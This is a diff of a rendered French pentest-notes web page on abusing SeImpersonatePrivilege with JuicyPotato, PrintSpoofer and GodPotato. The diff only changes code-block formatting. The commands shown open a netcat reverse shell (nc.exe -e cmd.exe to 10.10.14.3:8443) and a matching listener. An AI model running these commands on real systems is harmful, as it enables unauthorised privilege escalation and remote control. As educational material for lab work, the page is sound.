@@ -7759,20 +7759,20 @@
 <p>Si ce privilège est accordé à un utilisateur ou processus non fiable, il peut être exploité pour élever des privilèges et effectuer des actions non autorisées.</p>
 <h3 id="utilisation-de-juicypotatoexe">Utilisation de JuicyPotato.exe</h3>
 <p>JuicyPotato est un outil qui peut abuser de ce privilège pour exécuter un code arbitraire avec des privilèges élevés. Notez que cet outil ne fonctionne pas à partir de Windows Server 2019/Windows 10 à cause des améliorations de sécurité.</p>
-<pre><code class="language-powershell">JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe&quot; -t *
-</code></pre>
-<pre><code class="language-bash">nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">JuicyPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-l</span> <span class="n">53375</span> <span class="n">-p</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a</span> <span class="s2">&quot;/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe&quot;</span> <span class="n">-t</span> <span class="p">*</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">8443</span><span class="w">  </span><span class="c1"># Ecoute sur le port 8443 pour une connexion entrante`</span>
+</span></code></pre></div>
 <h3 id="utilisation-de-printspooferexe">Utilisation de PrintSpoofer.exe</h3>
 <p>PrintSpoofer est une autre technique qui abuse du privilège <code>SeImpersonatePrivilege</code> pour élever des privilèges :</p>
-<pre><code class="language-powershell">PrintSpoofer.exe -c &quot;c:\tools\nc.exe 10.10.14.3 8443 -e cmd&quot;
-</code></pre>
-<pre><code class="language-bash">nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&quot;c:\tools\nc.exe 10.10.14.3 8443 -e cmd&quot;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">8443</span><span class="w">  </span><span class="c1"># Ecoute sur le port 8443 pour une connexion entrante`</span>
+</span></code></pre></div>
 <h3 id="utilisation-de-godpotatoexe">Utilisation de GodPotato.exe</h3>
 <p>GodPotato est encore une autre patate qui abuse du privilège <code>SeImpersonatePrivilege</code> pour élever des privilèges :</p>
-<pre><code class="language-powershell">GodPotato -cmd &quot;cmd /c whoami&quot;
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">GodPotato</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
+</span></code></pre></div>
 <blockquote>
 <p>[!Astuce]
 GodPotato est à privilégier, il s'agit du plus simple et est compatible avec Windows Server 2019/Windows 10 !</p>
@@ -7830,7 +7830,7 @@ GodPotato est à privilégier, il s'agit du plus simple et est compatible avec W
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
